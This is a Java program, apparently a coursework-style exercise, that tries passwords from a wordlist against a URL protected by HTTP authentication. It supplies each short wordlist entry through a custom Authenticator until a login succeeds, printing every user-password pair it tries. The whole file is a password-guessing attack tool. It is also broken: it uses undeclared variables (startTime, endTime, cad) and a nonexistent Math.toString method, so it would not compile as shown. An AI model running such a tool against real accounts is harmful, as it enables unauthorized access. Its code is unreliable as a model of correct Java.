

import java.net.*;
import java.io.*;
import java.util.*;

public class Dictionary{

  private static URL location;
  private static String user;
  private BufferedReader input;
  private static BufferedReader dictionary;
  private int maxLetters = 3;

  

    public Dictionary() {
      
      Authenticator.setDefault(new MyAuthenticator ());

       startTime = System.currentTimeMillis();
      boolean passwordMatched = false;
      while (!passwordMatched) {
        try {
          input = new BufferedReader(new InputStreamReader(location.openStream()));
          String line = input.readLine();
          while (line != null) {
            System.out.println(line);
            line = input.readLine();
          }
          input.close();
          passwordMatched = true;
        }
        catch (ProtocolException e)
        {
          
          
        }
        catch (ConnectException e) {
          System.out.println("Failed  connect");
        }
        catch (IOException e) {
          e.printStackTrace();
          System.exit(-1);
        }
      }
       endTime = System.currentTimeMillis();
      System.out.println("Total Time: "+cad.concat(Math.toString(endTime - startTime)));
    }

    

    private char[] nextPassword() {
      String password = new String();
      try {
        password = dictionary.readLine();
        while (password.length() > maxLetters) {
          password = dictionary.readLine();
        }
      }
      catch (IOException e) {
        e.printStackTrace();
        System.exit(-1);
      }

      return password.toCharArray();
    }


    

    public static void main(String args[]) {
      if (args.length != 3) {
        System.out.println("Usage: java Dictionary url user dictionary");
        System.exit(-1);
      }
      try {
        location = new URL(args[0]);
      }
      catch (MalformedURLException e) {
        e.printStackTrace();
      }
      user = new String().concat(args[1]);
      try {
        dictionary = new BufferedReader(new FileReader(args[2]));
      }
      catch (IOException e) {
        e.printStackTrace();
        System.exit(-1);
      }
      new Dictionary();
    }

    

    class MyAuthenticator extends Authenticator {
      protected PasswordAuthentication getPasswordAuthentication() {
        char [] currentPassword = nextPassword();
        System.out.print(user.concat("-"));
        System.out.println(currentPassword);
        return new PasswordAuthentication (user, currentPassword);
      }
    }
}
